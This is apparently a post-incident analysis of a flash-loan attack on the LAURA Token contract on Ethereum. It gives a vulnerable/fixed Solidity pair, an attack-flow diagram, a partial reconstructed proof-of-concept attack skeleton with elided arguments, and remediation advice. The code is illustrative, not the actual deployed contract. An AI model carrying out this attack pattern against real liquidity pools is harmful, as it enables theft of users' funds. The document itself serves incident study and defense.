# LAURA Token — Analysis of Abnormal Withdrawal via Liquidity Manipulation

| Item | Details |
|------|------|
| **Date** | 2025-01-06 |
| **Protocol** | LAURA Token |
| **Chain** | Ethereum |
| **Loss** | ~$41,200 (12.34 ETH) |
| **Attacker** | [Unidentified](https://etherscan.io/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://etherscan.io) |
| **Vulnerable Contract** | [Unidentified](https://etherscan.io) |
| **Root Cause** | `removeLiquidityWhenKIncreases` function callable under imbalanced liquidity pair state, allowing excess withdrawal |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/LAURAToken_exp.sol) |

---

## 1. Vulnerability Overview

The LAURA Token protocol provided a special function `removeLiquidityWhenKIncreases` that allowed liquidity providers to remove liquidity when the K value (price product invariant) increased. The attacker borrowed a 30,000 WETH flash loan from Balancer and artificially manipulated the liquidity of the LAURA/WETH pair, satisfying the K value condition and removing an abnormally large amount of liquidity.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: only checks K value increase condition, ignores manipulation possibility
function removeLiquidityWhenKIncreases(uint256 liquidity) external {
    uint256 currentK = reserve0 * reserve1;
    // Allows liquidity removal if K exceeds initial value — manipulable via flash loan
    require(currentK > initialK, "K not increased");
    _removeLiquidity(msg.sender, liquidity);
}

// ✅ Safe code: flash loan defense and time-weighted average K value
function removeLiquidityWhenKIncreases(uint256 liquidity) external {
    require(!isFlashLoan, "No flash loan");          // Prevent reentrancy/flash loan
    uint256 twapK = getTWAPK();                      // Use TWAP-based K value
    require(twapK > initialK, "K not increased");
    _removeLiquidity(msg.sender, liquidity);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Obtain 30,000 WETH flash loan from Balancer
  │
  ├─→ [2] Swap WETH → LAURA (MAGIC_NUMBER: 11526249223479392795400)
  │         └─ LAURA pool WETH balance surges → K value artificially inflated
  │
  ├─→ [3] Add liquidity to LAURA/WETH pair (acquire LP tokens)
  │
  ├─→ [4] Call removeLiquidityWhenKIncreases()
  │         └─ K value condition satisfied → excess liquidity removal allowed
  │
  ├─→ [5] Swap remaining LAURA → WETH
  │
  └─→ [6] Repay flash loan and collect profit (~12.34 ETH)
```

## 4. PoC Code (Core Logic)

```solidity
// PoC not fully obtained — reconstructed from WebFetch summary

contract AttackerC0 {
    function attack() external {
        // [1] Request 30,000 WETH flash loan from Balancer
        IBalancerVault(BALANCER).flashLoan(
            address(this),
            tokens,
            amounts, // 30,000 WETH
            ""
        );
    }
}

contract AttackerC1 {
    function receiveFlashLoan(...) external {
        // [2] Swap WETH → LAURA using MAGIC_NUMBER
        // MAGIC_NUMBER = 11526249223479392795400
        // Large swap artificially inflates pool's K value
        router.swapExactTokensForTokens(MAGIC_NUMBER, ...);

        // [3] Add liquidity (acquire LP tokens)
        router.addLiquidity(LAURA, WETH, ...);

        // [4] Trigger K value increase condition → abnormal liquidity removal
        ILAURAToken(victim).removeLiquidityWhenKIncreases(lpBalance);

        // [5] Swap remaining LAURA → WETH
        router.swapExactTokensForTokens(lauraBalance, ...);

        // [6] Repay flash loan
        IERC20(WETH).transfer(BALANCER, loanAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing spot K value condition validation (removeLiquidityWhenKIncreases relies on manipulable instantaneous reserve ratio) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan exploitation) |
| **DApp Category** | AMM / Liquidity Pool |
| **Impact** | Liquidity pool fund theft |

## 6. Remediation Recommendations

1. **Flash Loan Defense**: Apply `nonReentrant` guard or custom locking mechanism to track flash loan state within a transaction
2. **TWAP-Based K Value Validation**: Calculate K value using time-weighted average price (TWAP) instead of spot K value to prevent manipulation
3. **Liquidity Lock Period**: Add a condition preventing liquidity removal for a minimum of n blocks after liquidity is added
4. **K Value Change Rate Limit**: Block function execution when K value fluctuates beyond a threshold within a single transaction

## 7. Lessons Learned

- In AMM-based protocols, special functions that use the K value invariant as a condition can be easily bypassed via flash loans.
- All conditional checks that rely on spot values are vulnerable to price manipulation and should be replaced with TWAP or multi-block average values.
- The attack pattern of splitting into two contracts (AttackerC0/C1) is frequently used to bypass Ethereum stack depth limits.